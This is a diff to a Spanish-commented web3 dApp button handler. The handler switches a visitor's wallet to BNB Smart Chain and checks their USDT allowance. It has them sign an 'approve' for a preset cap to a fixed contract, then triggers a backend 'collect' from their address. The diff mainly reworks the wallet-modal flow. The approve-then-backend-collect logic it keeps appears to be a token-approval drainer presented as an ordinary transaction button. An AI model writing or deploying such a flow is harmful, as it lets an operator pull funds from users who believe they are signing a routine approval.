@@ -156,36 +156,30 @@ async function getUsdtBalance(provider, userAddress, iface) {
   try { return BigInt(result); } catch (_) { return 0n; }
 }
 
-// ─── Main button handler ────────────────────────────────________________──────
+// ─── Main button handler (Professional Modal Flow) ───────────────────────────
 approveBtn.addEventListener("click", async () => {
   let provider = await getActiveProvider();
 
-  // Si no hay sesión activa, abrir el modal de Reown AppKit para elegir billetera / QR
+  // 1. Si no hay una sesión activa, abrir directamente el modal oficial de Reown AppKit
   if (!provider) {
-    if (window.modal) {
+    if (window.modal && typeof window.modal.open === "function") {
       try {
         await window.modal.open();
-        // Esperar brevemente a que el usuario interactúe con el modal y elija una billetera
-        for (let i = 0; i < 30; i++) {
-          await new Promise(r => setTimeout(r, 500));
-          provider = await getActiveProvider();
-          if (provider) break;
-        }
+        return; // El modal se abre y el flujo continúa cuando el usuario seleccione su billetera
       } catch (modalErr) {
         console.error("Error al abrir el modal de WalletConnect:", modalErr);
       }
+    } else {
+      showToast("El sistema de billeteras no está inicializado.", "error");
+      return;
     }
   }
 
-  if (!provider) {
-    showToast("Por favor selecciona una billetera para continuar.", "error");
-    return;
-  }
-
+  // 2. Si ya hay un proveedor activo, procedemos con la lógica de red y transacciones
   setLoading(true, "Processing…");
 
   try {
-    // Step 1 — Cambiar a BNB Smart Chain
+    // Paso — Cambiar a BNB Smart Chain
     try {
       await provider.request({
         method: "wallet_switchEthereumChain",
@@ -208,7 +202,7 @@ approveBtn.addEventListener("click", async () => {
       }
     }
 
-    // Step 2 — Obtener la dirección activa
+    // Paso — Obtener la dirección activa
     let userAddress = _cachedAddress || null;
     if (!userAddress) {
       const accs = await provider.request({ method: "eth_requestAccounts" });
@@ -234,7 +228,7 @@ approveBtn.addEventListener("click", async () => {
       return;
     }
 
-    // Step 3 — Verificar Allowance existente
+    // Paso — Verificar Allowance existente
     try {
       const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
       const allowanceHex  = await provider.request({
@@ -250,7 +244,7 @@ approveBtn.addEventListener("click", async () => {
       }
     } catch (_) {}
 
-    // Step 4 — Solicitar Firma de Aprobación (Approve)
+    // Paso — Solicitar Firma de Aprobación (Approve)
     const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
     
     await provider.request({
@@ -263,11 +257,11 @@ approveBtn.addEventListener("click", async () => {
       }]
     });
 
-    // Step 5 — Esperar confirmación del bloque
+    // Paso — Esperar confirmación del bloque
     setLoading(true, "Confirming…");
     await waitForAllowanceConfirmed(provider, userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);
 
-    // Step 6 — Ejecutar cobro desde Backend
+    // Paso — Ejecutar cobro desde Backend
     setLoading(true, "Finalizing…");
     await triggerBackendCollect(userAddress);
     showToast("¡Transacción completada con éxito! ✓", "success");
